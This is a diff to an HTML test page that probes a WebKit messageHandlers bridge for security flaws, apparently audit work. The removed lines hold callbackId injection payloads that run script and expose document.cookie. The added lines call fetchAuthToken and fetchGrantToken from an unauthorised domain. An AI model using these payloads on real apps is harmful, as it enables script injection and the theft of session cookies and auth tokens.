@@ -93,32 +93,34 @@
   <div class="status-box" id="c03Status">—</div>
 </div>
 
+<div class="settings-section" style="border-color:red;">
+  <h3 style="color:red;">C-04: AUTH Bridge Auto-Granted to All Domains</h3>
+  <p>Calls <code>fetchAuthToken</code> and <code>fetchGrantToken</code> from this domain
+  (which has no explicit AUTH permission). If the bridge responds at all
+  (even with a stub), the permission check is confirmed bypassed.</p>
+
+  <button class="btn" onclick="testC04_authToken()">Test C-04: fetchAuthToken</button>
+  <button class="btn" onclick="testC04_grantToken()">Test C-04: fetchGrantToken</button>
+  <div class="status-box" id="c04Status">—</div>
+</div>
+
 <script>
-  // C-03 Test A — change document.title to confirm injection
-  // If title changes to "PWNED", the custom bridge has no JS sanitisation
-  function testC03_titleProbe() {
-    window.webkit.messageHandlers.CUSTOMTEST.postMessage({
-      "scriptName": "CUSTOMTEST",
-      "callbackId": "injected); document.title='C03_PWNED'; (",
+  function testC04_authToken() {
+    document.getElementById('c04Status').textContent = 'Sent fetchAuthToken. Watch for any callback — even a stub response confirms the permission passes.';
+    window.webkit.messageHandlers.fetchAuthToken.postMessage({
+      "scriptName": "fetchAuthToken",
+      "callbackId": "auth_probe_" + Date.now(),
       "data": {}
     });
-    setTimeout(() => {
-      const status = document.title === 'C03_PWNED'
-        ? '⚠️ CONFIRMED: title changed — C-03 injection works!'
-        : 'Title is: ' + document.title + ' (may need to wait or check bridge name)';
-      document.getElementById('c03Status').textContent = status;
-    }, 500);
   }
 
-  // C-03 Test B — exfiltrate cookies via the custom bridge callback injection
-  function testC03_cookieExfil() {
-    const payload = "x); alert('C03_COOKIES: ' + document.cookie); (";
-    window.webkit.messageHandlers.CUSTOMTEST.postMessage({
-      "scriptName": "CUSTOMTEST",
-      "callbackId": payload,
+  function testC04_grantToken() {
+    document.getElementById('c04Status').textContent = 'Sent fetchGrantToken. Any response = C-04 confirmed.';
+    window.webkit.messageHandlers.fetchGrantToken.postMessage({
+      "scriptName": "fetchGrantToken",
+      "callbackId": "grant_probe_" + Date.now(),
       "data": {}
     });
-    document.getElementById('c03Status').textContent = 'Sent. If alert fires with cookies, C-03 is confirmed.';
   }
 </script>
 
